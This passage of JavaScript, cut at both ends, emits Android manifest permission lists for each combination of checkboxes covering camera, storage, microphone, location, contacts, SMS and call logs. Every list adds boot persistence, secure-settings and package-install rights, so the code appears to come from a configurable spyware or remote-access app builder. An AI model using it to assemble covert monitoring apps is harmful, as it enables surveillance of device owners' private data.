            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            ` 
        }
        //if three are checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>

            ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }



          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
